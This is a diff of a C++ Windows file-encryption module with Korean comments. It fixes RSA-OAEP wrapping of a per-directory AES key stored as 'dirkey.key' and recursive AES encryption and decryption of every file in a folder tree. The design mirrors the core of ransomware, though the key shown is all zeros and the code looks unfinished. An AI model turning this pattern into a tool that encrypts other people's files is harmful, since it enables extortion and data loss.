@@ -1,3 +1,4 @@
+#define _CRT_SECURE_NO_WARNINGS
 #include "fileEnc.hpp"
 
 
@@ -12,13 +13,9 @@ string getUserName() {
 
 
 void SaveEncKey(RSA* pubKey, string& dirName, unsigned char* key) {
-
+    unsigned char encryptedData[256] = { 0x01 , };
     // RSA 암호화
-    std::vector<unsigned char> encryptedData(RSA_size(pubKey), 0);
-    int result = RSA_public_encrypt(sizeof(key), key, encryptedData.data(), pubKey, RSA_PKCS1_PADDING);
-    for (int i = 0; i < 32; i++) {
-        printf("%02x", key[i]);
-    }
+    int result = RSA_public_encrypt(32, key, encryptedData, pubKey, RSA_PKCS1_OAEP_PADDING);
     if (result == -1) {
         std::cerr << "Error encrypting data." << std::endl;
         RSA_free(pubKey);
@@ -30,30 +27,43 @@ void SaveEncKey(RSA* pubKey, string& dirName, unsigned char* key) {
         cout << "파일 오픈 실패" << endl;
         return;
     }
-    WriteFile(handle, encryptedData.data(), sizeof(encryptedData.data()), NULL, NULL);
 
+    WriteFile(handle, encryptedData, sizeof(encryptedData), NULL, NULL);
+    CloseHandle(handle);
 }
 
+
 void GetDecKey(RSA* priKey, string& dirName, unsigned char* key) {
-    DWORD size = 512;
     DWORD nRead;
-    unsigned char buf[512] = { 0x00, };
-    string name = dirName + "\\";
-    HANDLE handle = CreateFileA((name + "dirkey.key").c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
+    unsigned char buf[256] = { 0x00, };
+
+    string name = dirName + "\\dirkey.key";
+    HANDLE handle = CreateFileA((name).c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
     if (handle == INVALID_HANDLE_VALUE) {
+        cout << GetLastError();
         cout << "파일 오픈 실패" << endl;
         return;
     }
-    if (ReadFile(handle, buf, size, &nRead, NULL) != TRUE) {
+    if (ReadFile(handle, buf, 256, &nRead, NULL) != TRUE) {
         cout << "read dec key error" << "\n";
     }
-    int result = RSA_private_decrypt(sizeof(buf), buf, key, priKey, RSA_PKCS1_PADDING);
 
+    int result = RSA_private_decrypt(256, buf, key, priKey, RSA_PKCS1_OAEP_PADDING);
+    if (result == -1) {
+        std::cerr << "Error decrypting data." << std::endl;
+        RSA_free(priKey);
+    }
+
+    CloseHandle(handle);
 }
 
 
 void EncryptDir(RSA* pubKey, string& dirName) {
     unsigned char _key[32] = {0x00, }; // generateKey();
+    
+    cout << "pubKey in encrypt dir " << endl;
+    cout << pubKey << endl;
+
     SaveEncKey(pubKey, dirName, _key);
 
     WIN32_FIND_DATAA data;
@@ -86,7 +96,6 @@ void EncryptDir(RSA* pubKey, string& dirName) {
     } while (FindNextFileA(hFind, &data) != 0);
 
     FindClose(hFind);
-
 }
 
 
@@ -151,7 +160,6 @@ void EncryptFileByAES(unsigned char* key, string& dirName, string& fileName) {
 
     free(plain_buf);
     free(cipher_buf);
-
 }
 
 
@@ -162,11 +170,8 @@ void EncryptText(unsigned char* plain, unsigned int plainLength, unsigned char* 
 }
 
 
-
-
-void DecryptDir(RSA* pubKey, string& dirName)
-{
-    unsigned char _key[32] = { 0x00, };
+void DecryptDir(RSA* pubKey, string& dirName) {
+    unsigned char _key[32] = { 0x02, };
     GetDecKey(pubKey, dirName, _key);
 
     WIN32_FIND_DATAA data;
@@ -187,20 +192,17 @@ void DecryptDir(RSA* pubKey, string& dirName)
         else
             files.push_back(data.cFileName);
     } while (FindNextFileA(hFind, &data) != 0);
-
     FindClose(hFind);
 
 
     // 파일 출력
-    for (string& file : files)
-    {
+    for (string& file : files){
         cout << "[File] " << file << endl;
         DecryptFileByAES(_key, dirName, file);
     }
 
     // 폴더 출력
-    for (string& folder : folders)
-    {
+    for (string& folder : folders) {
         if (folder == "." || folder == "..") {
             continue;
         }
